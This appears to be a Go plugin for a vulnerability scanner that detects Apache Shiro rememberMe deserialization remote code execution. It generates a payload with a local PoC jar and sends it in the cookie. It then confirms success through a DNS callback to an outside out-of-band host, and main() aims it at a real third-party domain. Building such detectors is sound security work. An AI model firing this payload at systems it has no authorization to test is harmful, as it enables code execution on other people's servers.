/*
host
*/
package main

import (
	"fmt"
	"net/url"
	"regexp"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/util"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	InitDnsCache   = zhttp.SetDnsCache
	command        = "java -jar source/shiro-poc.jar %s.shiro.woshiyingxiong.com %d 8000"
	payloadPattern = regexp.MustCompile(`poc:([a-zA-Z\d+/=]+)`)
	dnsUrl         = "http://woshiyingxiong.com:8000/api/dns/shiro/%s/"
)

func Verify(params engine.Params) (result engine.Result) {
	resp, err := zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
		DialTimeout:        time.Second * 5,
		RequestTimeout:     time.Second * 5,
		Hosts:              params.Hosts,
		InsecureSkipVerify: true,
		DisableRedirect:    true,
		Cookies: map[string]string{
			"rememberMe": "jdscanner",
		},
	})
	if err != nil {
		return
	}
	resp.Close()

	if resp.HasCookieAndValue("rememberMe", "deleteMe") {
		for i := 1; i < 3; i++ {
			command := fmt.Sprintf(command, params.TargetId, i)
			stdout, stderr, err := util.Exec(command, time.Second*60)
			if err != nil {
				result.Err = "[stdout]\n" + stdout + "\n[stderr]\n" + stderr + "\n[err]\n" + err.Error()
				return
			}

			payloadMatch := payloadPattern.FindStringSubmatch(stdout)
			if len(payloadMatch) > 0 {
				presp, err := zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
					DialTimeout:        time.Second * 5,
					RequestTimeout:     time.Second * 5,
					Hosts:              params.Hosts,
					InsecureSkipVerify: true,
					DisableRedirect:    true,
					Cookies: map[string]string{
						"rememberMe": payloadMatch[1],
					},
				})
				if err != nil {
					continue
				}
				presp.Close()

				resp, err := zhttp.Get(fmt.Sprintf(dnsUrl, params.TargetId), &zhttp.RequestOptions{
					DialTimeout:        time.Second * 5,
					RequestTimeout:     time.Second * 5,
					InsecureSkipVerify: true,
					DisableRedirect:    true,
				})
				if err != nil {
					continue
				}
				body := resp.String()
				resp.Close()
				if body == "True" {
					result.Vul = true
					result.VulUrl = params.ParsedTarget.String()
					result.RawReq = presp.RawRequest()
					result.VulInfo = "shiro远程命令执行"
					return
				}
			}
		}
	}
	return
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://voice.jd.com/"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
